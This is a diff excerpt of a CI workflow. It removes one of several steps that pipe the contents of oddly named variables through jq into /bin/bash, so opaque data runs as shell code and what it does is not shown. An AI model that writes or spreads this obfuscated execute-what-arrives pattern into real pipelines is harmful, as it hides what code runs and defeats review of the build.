@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$njn245" | jq -r .tdroo0 | /bin/bash
           printf '%s' "$pi34821" | jq -r .ybsh36634 | /bin/bash
           printf '%s' "$bd22731" | jq -r .ls58141 | /bin/bash
-          printf '%s' "$da12" | jq -r .l04546 | /bin/bash
           printf '%s' "$sd9" | jq -r .dlk00807 | /bin/bash
 
       - name: Upload results
